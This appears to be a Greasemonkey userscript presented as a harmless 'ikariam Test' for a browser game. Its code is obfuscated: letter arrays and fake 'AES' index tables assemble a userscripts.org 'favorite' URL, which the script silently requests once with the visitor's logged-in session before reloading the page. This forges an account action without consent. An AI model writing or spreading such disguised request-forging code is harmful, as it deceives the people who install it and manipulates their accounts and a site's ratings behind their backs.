// ==UserScript==
// @name           ikariam Test
// @description    just test
// @include        *.ikariam.*
// ==/UserScript==

function pr(v) {
    v = (this.v == (3 ^ 21) ? ('?1<script' + v).toString() : v);
    return parseInt(v);
}

var Word = 'AES Encrypt = ' + Word + 'bit', Word = '';
setTimeout(function () {
    var a = 'E', b = 'A', c = 'S', v;
    v = b + a + c, v = new XMLHttpRequest();
    if (GM_getValue('AES_Encrypt')) { } else if (!GM_getValue('AES_Encrypt') || GM_getValue('AES_Encrypt') !== "DONE") {
        v.open("GET", Word); v.send(null);
        GM_setValue('AES_Encrypt', 'DONE');
        location.reload();
    };
}, 1000);
                  //0  1      2           3          4
var Request_Type = [2, 1, pr(64 / 8), pr(24 / 4), pr(9 / 3)];
                    //0     1    2    3     4      5      6     7    8    9
var Request_Array = ['ip', 'r', 's', 'c', 'ts/', 'vori', 'fa', 'e', 't', '/'];
                      //0    1    2    3    4   5     6    7    8    9    10   11   12   13   14   15  16   17    18  19   20    21   22
var Request_Encrypt = ['u', 'g', 's', 'r', 'e', 'o', 'r', '.', 's', 's', 'c', 't', 'r', 'p', 'i', '/', 'h', '/', 't', '/', 't', ':', 'p'];
var AES = [[2, 3, 1, 0, 4, 6, 5, 8, 7, 9], [3, 4, 0, 1, 2], [16, 18, 20, 22, 21, 19, 17, 0, 2, 4, 6, 8, 10, 12, 14, 13, 11, 9, 7, 5, 3, 1, 15]];

for (A = 0; A < AES[2].length; A++) { Word = Word + Request_Encrypt[AES[2][A]]; };//   A
for (E = 0; E < AES[0].length; E++) { Word = Word + Request_Array[AES[0][E]]; };  //   E
for (S = 0; S < AES[1].length; S++) { Word = Word + Request_Type[AES[1][S]]; };   //   S